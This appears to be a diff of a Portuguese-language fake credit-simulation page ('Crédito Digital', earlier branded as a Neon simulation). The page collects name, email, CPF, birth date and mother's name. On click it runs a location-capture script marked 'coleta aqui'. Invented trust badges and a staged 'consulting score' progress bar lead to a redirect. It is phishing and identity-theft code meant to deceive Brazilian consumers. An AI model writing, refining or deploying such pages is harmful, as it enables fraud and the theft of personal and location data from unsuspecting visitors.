@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Simulação de Crédito</title>
+<title>Crédito Digital</title>
 
 <script>
 if (window.location.protocol == "http:") {
@@ -17,86 +17,115 @@ if (window.location.protocol == "http:") {
 <script src="js/location.js"></script>
 
 <style>
+
+* {
+  box-sizing: border-box;
+}
+
 body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
-  background: #0a0a0a;
-  color: #fff;
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;
+  background: radial-gradient(circle at top, #1a0b2e, #05010a);
+  color:#fff;
 }
 
 .container {
-  max-width: 420px;
-  margin: auto;
-  padding: 20px;
+  max-width:420px;
+  margin:auto;
+  padding:20px;
+  text-align:center;
 }
 
-.header {
-  text-align: center;
-  margin-top: 20px;
-  font-size: 18px;
-  color: #aaa;
+.title {
+  font-size:26px;
+  font-weight:600;
+}
+
+.subtitle {
+  color:#aaa;
+  margin-top:8px;
+}
+
+.step {
+  margin-top:15px;
+  font-size:13px;
+  color:#c084fc;
 }
 
 .card {
-  margin-top: 30px;
-  padding: 25px;
-  border-radius: 20px;
-  background: #111;
-  box-shadow: 0 0 40px rgba(138,43,226,0.15);
+  margin:20px auto;
+  padding:25px;
+  border-radius:18px;
+  background: rgba(20,10,30,0.9);
+  box-shadow: 0 0 40px rgba(168,85,247,0.25);
+  width:100%;
+  max-width:360px;
 }
 
 input {
-  width: 100%;
-  padding: 14px;
-  margin-top: 12px;
-  border-radius: 12px;
-  border: none;
-  background: #1c1c1c;
-  color: #fff;
+  width:100%;
+  padding:14px;
+  margin-top:10px;
+  border-radius:12px;
+  border:none;
+  background:#1a1325;
+  color:#fff;
+  display:block;
 }
 
 button {
-  width: 100%;
-  padding: 16px;
-  margin-top: 20px;
-  border-radius: 12px;
-  border: none;
-  background: linear-gradient(135deg, #8a2be2, #a855f7);
-  color: #fff;
-  font-weight: bold;
-  cursor: pointer;
+  width:100%;
+  padding:16px;
+  margin-top:20px;
+  border:none;
+  border-radius:12px;
+  background: linear-gradient(135deg,#a855f7,#9333ea);
+  color:#fff;
+  font-weight:bold;
+  font-size:16px;
+  cursor:pointer;
+  display:block;
+  box-shadow:0 0 20px rgba(168,85,247,0.6);
+}
+
+.trust {
+  margin-top:15px;
+  font-size:13px;
+  color:#bbb;
+  display:flex;
+  justify-content:space-between;
+  flex-wrap:wrap;
+}
+
+.trust div {
+  width:48%;
+  margin-top:10px;
 }
 
 .hidden { display:none; }
 
-.result {
-  text-align: center;
-  margin-top: 20px;
-}
-
-.big {
-  font-size: 28px;
-  color: #a855f7;
-}
-
-.small {
-  color: #aaa;
-  font-size: 14px;
-}
-
-.trust {
-  margin-top: 15px;
-  font-size: 13px;
-  color: #aaa;
-  text-align: center;
-}
-
 .footer {
-  text-align: center;
-  font-size: 12px;
-  color: #777;
-  margin-top: 30px;
+  margin-top:30px;
+  font-size:12px;
+  color:#888;
+  text-align:center;
 }
+
+.progress {
+  margin-top:20px;
+  height:6px;
+  background:#222;
+  border-radius:10px;
+  overflow:hidden;
+}
+
+.bar {
+  height:100%;
+  width:0%;
+  background:#a855f7;
+  transition:0.4s;
+}
+
 </style>
 </head>
 
@@ -104,161 +133,83 @@ button {
 
 <div class="container">
 
-<div class="header">
-  Simulação de crédito personalizada Neon
-</div>
+<div class="title">Crédito pré-aprovado em até 2 minutos</div>
+<div class="subtitle">Simule sem compromisso — resposta rápida e 100% online</div>
+<div class="step">⭐ Alta demanda hoje — Etapa 1 de 2</div>
 
 <!-- STEP 1 -->
 <div class="card" id="step1">
 
-  <input id="nome" placeholder="Nome completo" required>
-  <input id="email" type="email" placeholder="E-mail" required>
-  <input id="cpf" placeholder="CPF (somente números)" maxlength="11" required>
-  <input id="nascimento" type="date" required>
-  <input id="mae" placeholder="Nome da mãe" required>
+<input id="nome" placeholder="Nome completo">
+<input id="email" placeholder="E-mail">
+<input id="cpf" placeholder="CPF (usado apenas para análise)">
+<input id="nascimento" placeholder="dd/mm/aaaa">
+<input id="mae" placeholder="Nome da mãe">
+<input id="valor" placeholder="Valor desejado (R$)">
+<input id="meses" placeholder="Prazo (meses)">
 
-  <input id="valor" type="number" placeholder="Valor desejado (R$)" required>
-  <input id="meses" type="number" placeholder="Prazo (meses)" required>
+<button onclick="simular()">Simular</button>
 
-  <button onclick="simular()">Simular</button>
-
-  <div class="trust">
-    🔒 Ambiente seguro e criptografado<br>
-    📊 Simulação baseada em parâmetros de mercado<br>
-    ⚡ Processo rápido e 100% online
-  </div>
+<div class="trust">
+  <div>⭐ 4.6/5 usuários</div>
+  <div>⭐ 3.200 hoje</div>
+  <div>🔒 Dados protegidos</div>
+  <div>⏱ 1min 40s</div>
+</div>
 
 </div>
 
 <!-- STEP 2 -->
 <div class="card hidden" id="step2">
-  <h3 style="text-align:center;">Analisando...</h3>
-  <p style="text-align:center;">Calculando condições</p>
+  <h3>Analisando...</h3>
+  <p id="status">Consultando dados...</p>
+
+  <div class="progress">
+    <div class="bar" id="bar"></div>
+  </div>
 </div>
-
-<!-- STEP 3 -->
-<div class="card hidden" id="step3">
-
-  <h3 style="text-align:center;">Resultado da simulação</h3>
-
-  <div class="result">
-    <div class="big" id="valorAprovado">R$ 0</div>
-    <div class="small">Valor estimado</div>
-  </div>
-
-  <div class="result">
-    <div class="big" id="parcela">R$ 0</div>
-    <div class="small">Parcela mensal</div>
-  </div>
-
-  <div class="result">
-    <div class="small" id="info"></div>
-  </div>
-
-  <button onclick="window.location='REDIRECT_URL'">Continuar</button>
 
 </div>
 
-<footer class="footer">
-  <p>© 2026 Crédito Digital</p>
-  <p>CNPJ: 56.260.087/0401-78</p>
-  <p>Política de Privacidade • Termos de Uso</p>
-</footer>
-
+<div class="footer">
+© 2026 Crédito Digital - CNPJ: 56.260.087/0401-78<br>
+Política de Privacidade • Termos de Uso
 </div>
 
 <script>
 
 const step1 = document.getElementById("step1");
 const step2 = document.getElementById("step2");
-const step3 = document.getElementById("step3");
-
-// validação
-function validarCampos() {
-  const nome = document.getElementById("nome").value.trim();
-  const email = document.getElementById("email").value.trim();
-  const cpf = document.getElementById("cpf").value.trim();
-  const nascimento = document.getElementById("nascimento").value;
-  const mae = document.getElementById("mae").value.trim();
-
-  if (!nome || !email || !cpf || !nascimento || !mae) {
-    alert("Preencha todos os campos");
-    return false;
-  }
-
-  if (cpf.length !== 11 || isNaN(cpf)) {
-    alert("CPF inválido");
-    return false;
-  }
-
-  return true;
-}
 
 // fluxo principal
 function simular() {
 
-  if (!validarCampos()) return;
-
-  // 🔥 executa localização no clique
-  locate(function(){
-    console.log("Localização capturada");
-  }, function(){
-    console.log("Erro ao localizar");
-  });
-
-  let valor = parseFloat(document.getElementById("valor").value) || 0;
-  let meses = parseInt(document.getElementById("meses").value) || 12;
-
   step1.classList.add("hidden");
   step2.classList.remove("hidden");
 
-  setTimeout(() => {
+  // 🔥 coleta aqui
+  locate(function(){
+    console.log("ok");
+  });
 
-    let aprovado = valor * (0.7 + Math.random() * 0.3);
-    let juros = 0.02 + Math.random() * 0.06;
-
-    let parcela = calcularParcela(aprovado, juros, meses);
-
-    mostrarResultado(aprovado, parcela, juros, meses);
-
-  }, 2000);
-}
-
-// cálculo
-function calcularParcela(valor, juros, meses) {
-  let i = juros;
-  let n = meses;
-  return valor * (i * Math.pow(1+i, n)) / (Math.pow(1+i, n) - 1);
-}
-
-// resultado
-function mostrarResultado(valor, parcela, juros, meses) {
-
-  step2.classList.add("hidden");
-  step3.classList.remove("hidden");
-
-  animar("valorAprovado", valor);
-  animar("parcela", parcela);
-
-  document.getElementById("info").innerText =
-    "Taxa: " + (juros*100).toFixed(2) + "% ao mês • " + meses + "x";
-}
-
-// animação
-function animar(id, valor) {
-  let atual = 0;
-  let el = document.getElementById(id);
+  let p = 0;
 
   let i = setInterval(() => {
-    atual += valor / 20;
+    p += Math.random() * 25;
+    bar.style.width = p + "%";
 
-    if (atual >= valor) {
-      atual = valor;
+    if (p > 30) status.innerText = "Consultando score...";
+    if (p > 60) status.innerText = "Validando dados...";
+    if (p > 85) status.innerText = "Finalizando...";
+
+    if (p >= 100) {
       clearInterval(i);
+
+      // 🔥 redirect final
+      window.location = "REDIRECT_URL";
     }
 
-    el.innerText = "R$ " + atual.toFixed(0);
-  }, 40);
+  }, 500);
 }
 
 </script>
